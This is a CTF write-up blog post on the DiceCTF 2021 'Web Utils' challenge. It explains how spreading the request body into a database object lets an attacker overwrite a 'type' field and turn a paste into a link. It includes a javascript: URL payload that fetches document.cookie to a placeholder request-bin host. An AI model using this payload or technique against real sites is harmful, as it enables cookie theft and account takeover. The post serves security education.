---
title: "Spread operator leading to XSS"
excerpt: "Writeup for the Web Utils chall in DiceCTF 2021."
date: 2021-02-08T09:15:30-03:00
categories:
  - Cybersecurity
tags:
  - Web
  - DiceCTF 2021
  - CTF
---

I found this chall very interesting because it has the same vulnerability as a [previous post I wrote](https://vccolombo.github.io/cybersecurity/idor-vulnerability-in-a-personal-project-api/) about a personal project of mine.

In this chall, you have pages to create both a shortened link to another URL or a Pastebin where you can write anything. They are both safe against XSS.

The problem arises in the API backend. At first, links you shorten should only start with `http://` or `https://`. But in the request to create them, you can add the field `type`, meaning you can use the CreatePaste API route to create a link by changing `type` to "link". This is possible because the object that is added to the database is created as follows:

`database.addData({ type: 'paste', ...req.body, uid });`

When `req.body` is spread, if it contains the field `type`, it will overwrite `type: 'paste'`. Now we can create an entry of type "link" without the check for `https?://`. By itself, this can't do much. However, one of the members of my team found a way to exploit it and get the flag.

In `view.html`, the page where you go when you open a link/pastebin, there is this line:

`if (type === 'link') return window.location = data;`

And by using the previous spread operator exploit, you can create a link with the following data:

`javascript:fetch('https://your-request-bin/c='+document.cookie)`

This special link executes javascript in the browser. So by sending it to the admin bot, it will execute a fetch to a site of our control containing his cookies. By checking the request on our page, it shows the admin's cookies, and we have the flag.
